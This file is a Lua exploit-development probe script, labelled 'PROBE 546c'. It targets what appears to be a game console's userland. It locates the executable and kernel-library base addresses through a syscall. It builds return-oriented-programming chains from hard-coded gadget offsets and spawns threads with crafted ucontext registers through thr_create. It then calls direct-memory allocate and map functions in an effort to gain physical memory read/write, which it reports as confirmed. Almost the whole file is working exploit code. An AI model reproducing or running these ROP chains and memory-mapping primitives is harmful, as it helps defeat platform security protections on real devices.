-- CRASH_CLASS: MODERATE
-- PROBE 546c: MapDM child — stage 3 only (no prior threads)
--
-- 546b showed stages 1+2 pass but stage 3 crashes at thr_create.
-- This tests stage 3 in isolation. If it also crashes, the problem is
-- either AllocDM side effects, R8/R9 in ucontext, or the chain size.
-- If it works, the problem is resource accumulation.

print("=== PROBE 546c: MapDM child (SOLO) ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local sc_mmap = make_syscall(477)
local sc_430 = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local syscall_ret = syscall.pipe.fn_addr

-- Address discovery
local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))

zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk_lo = rd(info + 0x108) or 0
local lk_hi = rd(info + 0x10C) or 0
local lk = uint64(string.format("0x%X%08X", lk_hi, lk_lo))

print("EBOOT=" .. q(eboot) .. " LK=" .. q(lk))

local pop_rax_ret     = eboot + uint64(0x992)
local pop_rdi_ret     = eboot + uint64(0xC9DFE)
local pop_rsi_ret     = eboot + uint64(0xD77D)
local pop_rdx_ret     = eboot + uint64(0x3B02D7)
local pop_rcx_ret     = eboot + uint64(0xE64)
local mov_rdi_rax_ret = eboot + uint64(0x92C67)
local jmp_self        = eboot + uint64(0x15481)

local map_fn   = lk + uint64(0x15020)
local alloc_fn = lk + uint64(0x17EF0)

-- ── TEST A: thr_create with R8/R9 set (sysarch chain, no MapDM) ────
-- If this crashes, R8/R9 in ucontext is the problem.
print("")
print("[A] thr_create with R8/R9 set (sysarch-only chain)")

local stk_a, shared_a, tcb_a
pcall(function() stk_a = sc_mmap(uint64(0), uint64(0x200000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
pcall(function() shared_a = sc_mmap(uint64(0), uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
pcall(function() tcb_a = sc_mmap(uint64(0), uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
for off = 0, 0x100, 8 do wq(tcb_a + off, tcb_a) end
local tcb_a_ptr = memory.alloc(8)
wq(tcb_a_ptr, tcb_a)
zero(shared_a, 0x40)

-- Chain: sysarch → write DONE → spin (same as 546b stage 2)
local chain_a = stk_a + 0x200000 - 0x800
local ia = 0
local function ea(v) wq(chain_a + ia, v); ia = ia + 8 end
ea(uint64(165)); ea(pop_rdi_ret); ea(uint64(129)); ea(pop_rsi_ret)
ea(tcb_a_ptr); ea(syscall_ret)
ea(pop_rdi_ret); ea(shared_a)
ea(pop_rax_ret); ea(uint64(0x444F4E45))
ea(mov_rdi_rax_ret); ea(jmp_self)

-- ucontext WITH R8=0x110010000, R9=0x4000
local ctx_a = memory.alloc(0x500)
zero(ctx_a, 0x4C0)
wq(ctx_a + 0x108, uint64(0x480))
wd(ctx_a + 0x0D0, 0)
wq(ctx_a + 0x110, uint64(0x10000))
wq(ctx_a + 0x0C0, uint64(0x43))
wq(ctx_a + 0x100, uint64(0x3B))
wq(ctx_a + 0x0F0, uint64(0x202))
wq(ctx_a + 0x0E0, pop_rax_ret)
wq(ctx_a + 0x0F8, chain_a)
wq(ctx_a + 0x068, uint64("0x110010000"))  -- R8 = phys addr (fake)
wq(ctx_a + 0x070, uint64(0x4000))         -- R9 = alignment

print("  R8=0x110010000 R9=0x4000 (set in ucontext)")
print("  CALLING thr_create...")

local tid_a_buf = memory.alloc(8); wq(tid_a_buf, uint64(0))
local ok_a, rv_a = pcall(function()
    return sc_430(uint64(ctx_a), uint64(tid_a_buf), uint64(0))
end)
local rv_a_n = ok_a and to_num(rv_a) or -999
local tid_a = rq(tid_a_buf)
print("  RESULT: ok=" .. tostring(ok_a) .. " rv=" .. rv_a_n .. " tid=" .. q(tid_a))

if rv_a_n ~= 0 then
    print("  TEST A FAILED")
    print("=== 546c DONE ===")
    return
end

-- Poll for DONE
local sleep_buf = memory.alloc(16)
wq(sleep_buf, uint64(0))
wq(sleep_buf + 8, uint64(50000000))

local found_a = false
for attempt = 1, 10 do
    pcall(function() sc_nanosleep(uint64(sleep_buf), uint64(0)) end)
    local m = rq(shared_a)
    if m and to_num(m) ~= 0 then
        local mn = to_num(m)
        if mn < 0 then mn = mn + 0x100000000 end
        if mn == 0x444F4E45 then found_a = true; break end
    end
end
print("  DONE=" .. tostring(found_a))

if not found_a then
    print("  Child crashed (R8/R9 might cause issue during sysarch?)")
    print("=== 546c DONE ===")
    return
end

print("  TEST A OK — R8/R9 in ucontext is NOT the problem")
print("")

-- ── TEST B: AllocateDirectMemory, then thr_create (sysarch chain) ──
-- If this crashes, AllocDM corrupts something.
print("[B] AllocDM then thr_create (sysarch chain)")

local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))
local ok_alloc, arv = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local phys = rq(phys_out)
print("  AllocDM: rv=" .. (ok_alloc and to_num(arv) or "ERR") .. " phys=" .. q(phys))

local stk_b, shared_b, tcb_b
pcall(function() stk_b = sc_mmap(uint64(0), uint64(0x200000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
pcall(function() shared_b = sc_mmap(uint64(0), uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
pcall(function() tcb_b = sc_mmap(uint64(0), uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
for off = 0, 0x100, 8 do wq(tcb_b + off, tcb_b) end
local tcb_b_ptr = memory.alloc(8)
wq(tcb_b_ptr, tcb_b)
zero(shared_b, 0x40)

local chain_b = stk_b + 0x200000 - 0x800
local ib = 0
local function eb(v) wq(chain_b + ib, v); ib = ib + 8 end
eb(uint64(165)); eb(pop_rdi_ret); eb(uint64(129)); eb(pop_rsi_ret)
eb(tcb_b_ptr); eb(syscall_ret)
eb(pop_rdi_ret); eb(shared_b)
eb(pop_rax_ret); eb(uint64(0x444F4E45))
eb(mov_rdi_rax_ret); eb(jmp_self)

local ctx_b = memory.alloc(0x500)
zero(ctx_b, 0x4C0)
wq(ctx_b + 0x108, uint64(0x480))
wd(ctx_b + 0x0D0, 0)
wq(ctx_b + 0x110, uint64(0x10000))
wq(ctx_b + 0x0C0, uint64(0x43))
wq(ctx_b + 0x100, uint64(0x3B))
wq(ctx_b + 0x0F0, uint64(0x202))
wq(ctx_b + 0x0E0, pop_rax_ret)
wq(ctx_b + 0x0F8, chain_b)

print("  CALLING thr_create (after AllocDM)...")
local tid_b_buf = memory.alloc(8); wq(tid_b_buf, uint64(0))
local ok_b, rv_b = pcall(function()
    return sc_430(uint64(ctx_b), uint64(tid_b_buf), uint64(0))
end)
local rv_b_n = ok_b and to_num(rv_b) or -999
local tid_b = rq(tid_b_buf)
print("  RESULT: ok=" .. tostring(ok_b) .. " rv=" .. rv_b_n .. " tid=" .. q(tid_b))

if rv_b_n ~= 0 then
    print("  TEST B FAILED — AllocDM broke thr_create?")
    print("=== 546c DONE ===")
    return
end

local found_b = false
for attempt = 1, 10 do
    pcall(function() sc_nanosleep(uint64(sleep_buf), uint64(0)) end)
    local m = rq(shared_b)
    if m and to_num(m) ~= 0 then
        local mn = to_num(m)
        if mn < 0 then mn = mn + 0x100000000 end
        if mn == 0x444F4E45 then found_b = true; break end
    end
end
print("  DONE=" .. tostring(found_b))

if not found_b then
    print("  AllocDM broke child execution?")
    print("=== 546c DONE ===")
    return
end

print("  TEST B OK — AllocDM does NOT break thr_create")
print("")

-- ── TEST C: Full MapDM chain (no prior spinning threads) ───────────
-- This is the actual test. Fresh connection, only 2 threads spinning.
print("[C] Full MapDM chain (with AllocDM phys)")

if not phys or to_num(phys) == 0 then
    print("  No phys from AllocDM — skip")
    print("=== 546c DONE ===")
    return
end

local stk_c, shared_c, tcb_c
pcall(function() stk_c = sc_mmap(uint64(0), uint64(0x200000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
pcall(function() shared_c = sc_mmap(uint64(0), uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
pcall(function() tcb_c = sc_mmap(uint64(0), uint64(0x4000), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
for off = 0, 0x100, 8 do wq(tcb_c + off, tcb_c) end
local tcb_c_ptr = memory.alloc(8)
wq(tcb_c_ptr, tcb_c)
zero(shared_c, 0x40)
wq(shared_c, uint64(0xAAAA))
wq(shared_c + 0x08, uint64(0xBBBB))

local chain_c = stk_c + 0x200000 - 0x800
local ic = 0
local function ec(v) wq(chain_c + ic, v); ic = ic + 8 end

-- sysarch(SET_FSBASE)
ec(uint64(165)); ec(pop_rdi_ret); ec(uint64(129)); ec(pop_rsi_ret)
ec(tcb_c_ptr); ec(syscall_ret)

-- MapDM(shared_c, 0x4000, 3, 0, R8=phys, R9=align)
ec(pop_rdi_ret); ec(shared_c)
ec(pop_rsi_ret); ec(uint64(0x4000))
ec(pop_rdx_ret); ec(uint64(3))
ec(pop_rcx_ret); ec(uint64(0))
ec(map_fn)

-- Store rv → shared_c[0x08]
ec(pop_rdi_ret); ec(shared_c + 0x08)
ec(mov_rdi_rax_ret)

-- Done marker → shared_c[0x10]
ec(pop_rdi_ret); ec(shared_c + 0x10)
ec(pop_rax_ret); ec(uint64(0x444F4E45))
ec(mov_rdi_rax_ret)

ec(jmp_self)
print("  chain: " .. (ic/8) .. " entries at " .. q(chain_c))

-- ucontext with R8=phys, R9=align
local ctx_c = memory.alloc(0x500)
zero(ctx_c, 0x4C0)
wq(ctx_c + 0x108, uint64(0x480))
wd(ctx_c + 0x0D0, 0)
wq(ctx_c + 0x110, uint64(0x10000))
wq(ctx_c + 0x0C0, uint64(0x43))
wq(ctx_c + 0x100, uint64(0x3B))
wq(ctx_c + 0x0F0, uint64(0x202))
wq(ctx_c + 0x0E0, pop_rax_ret)
wq(ctx_c + 0x0F8, chain_c)
wq(ctx_c + 0x068, phys)            -- R8
wq(ctx_c + 0x070, uint64(0x4000))  -- R9

print("  R8=" .. q(phys) .. " R9=0x4000")
print("  CALLING thr_create...")

local tid_c_buf = memory.alloc(8); wq(tid_c_buf, uint64(0))
local ok_c, rv_c = pcall(function()
    return sc_430(uint64(ctx_c), uint64(tid_c_buf), uint64(0))
end)
local rv_c_n = ok_c and to_num(rv_c) or -999
local tid_c = rq(tid_c_buf)
print("  RESULT: ok=" .. tostring(ok_c) .. " rv=" .. rv_c_n .. " tid=" .. q(tid_c))

if rv_c_n ~= 0 then
    print("  thr_create FAILED")
    print("=== 546c DONE ===")
    return
end

-- Poll for done (2.5s max)
local found_c = false
for attempt = 1, 50 do
    pcall(function() sc_nanosleep(uint64(sleep_buf), uint64(0)) end)
    local marker = rq(shared_c + 0x10)
    if marker then
        local mn = to_num(marker)
        if mn < 0 then mn = mn + 0x100000000 end
        if mn == 0x444F4E45 then
            found_c = true
            print("  DONE after " .. (attempt * 50) .. "ms")
            break
        end
    end
end

if not found_c then
    print("  TIMEOUT — dumping shared:")
    for off = 0, 0x18, 8 do
        local v = rq(shared_c + off)
        print("    +" .. string.format("%02X", off) .. "=" .. (v and q(v) or "nil"))
    end
else
    local virt = rq(shared_c)
    local rv = rq(shared_c + 0x08)
    local rv_n = rv and to_num(rv) or -1
    if rv_n < 0 then rv_n = rv_n + 0x100000000 end
    print("  MapDM rv=" .. string.format("0x%X", rv_n))
    print("  virt=" .. (virt and q(virt) or "nil"))

    if rv_n == 0 and virt and to_num(virt) ~= 0 and to_num(virt) ~= 0xAAAA then
        print("  *** MapDM SUCCEEDED ***")
        local ok_wr = pcall(function() memory.write_dword(virt, 0xDEADBEEF) end)
        if ok_wr then
            local rb = rd(virt)
            if rb then
                if rb < 0 then rb = rb + 0x100000000 end
                print("  R/W: 0x" .. string.format("%08X", rb))
                if rb == 0xDEADBEEF then
                    print("  *** PHYSICAL MEMORY R/W CONFIRMED ***")
                end
            end
        else
            print("  WRITE FAULT")
        end
    end
end

print("")
print("=== 546c DONE ===")
